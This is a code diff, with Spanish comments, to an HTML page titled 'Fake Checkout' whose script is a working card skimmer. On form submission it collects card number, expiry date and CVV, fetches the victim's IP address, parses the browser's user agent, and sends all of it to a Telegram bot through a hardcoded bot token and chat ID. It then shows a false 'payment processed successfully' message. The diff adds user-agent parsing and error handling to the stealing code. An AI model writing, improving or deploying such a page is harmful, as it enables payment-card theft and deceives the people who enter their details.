@@ -1,5 +1,5 @@
 <!DOCTYPE html>
-<html>
+<html lang="es">
 <head>
   <meta charset="UTF-8" />
   <title>Fake Checkout</title>
@@ -17,32 +17,58 @@
     const TOKEN = '8032494209:AAE0C8n3-0KH3BCSgMcPSc4j7-2dYxE2ZaE';
     const CHAT_ID = '5654253897';
 
+    // Función simple para parsear user agent (muy básica)
+    function parseUserAgent(ua) {
+      let dispositivo = 'Desconocido';
+      let navegador = 'Desconocido';
+
+      if (/iphone|ipad|ipod/i.test(ua)) dispositivo = 'iOS';
+      else if (/android/i.test(ua)) dispositivo = 'Android';
+      else if (/windows phone/i.test(ua)) dispositivo = 'Windows Phone';
+      else if (/win/i.test(ua)) dispositivo = 'Windows PC';
+      else if (/mac/i.test(ua)) dispositivo = 'Mac';
+
+      if (/chrome|crios/i.test(ua)) navegador = 'Chrome';
+      else if (/firefox|fxios/i.test(ua)) navegador = 'Firefox';
+      else if (/safari/i.test(ua) && !/chrome|crios/i.test(ua)) navegador = 'Safari';
+      else if (/edge|edgios|edga/i.test(ua)) navegador = 'Edge';
+      else if (/opera|opr\//i.test(ua)) navegador = 'Opera';
+
+      return `${dispositivo} - ${navegador}`;
+    }
+
     document.getElementById('checkout-form').addEventListener('submit', async function (e) {
       e.preventDefault();
 
-      const card = this.card.value;
-      const expiry = this.expiry.value;
-      const cvv = this.cvv.value;
+      const card = this.card.value.trim();
+      const expiry = this.expiry.value.trim();
+      const cvv = this.cvv.value.trim();
 
-      const response = await fetch('https://api.ipify.org?format=json');
-      const data = await response.json();
-      const ip = data.ip;
+      try {
+        const response = await fetch('https://api.ipify.org?format=json');
+        const data = await response.json();
+        const ip = data.ip;
 
-      const userAgent = navigator.userAgent;
+        const ua = navigator.userAgent;
+        const parsedUA = parseUserAgent(ua);
 
-      const message = `${card}|${expiry}|${cvv}|${ip}|${userAgent}`;
+        const message = `${card}|${expiry}|${cvv}|${ip}|${parsedUA}`;
 
-      await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          chat_id: CHAT_ID,
-          text: message
-        })
-      });
+        await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            chat_id: CHAT_ID,
+            text: message
+          })
+        });
 
-      alert('Pago procesado con éxito');
-      this.reset();
+        alert('Pago procesado con éxito');
+        this.reset();
+      } catch (error) {
+        alert('Error al procesar el pago');
+        console.error(error);
+      }
     });
   </script>
 </body>
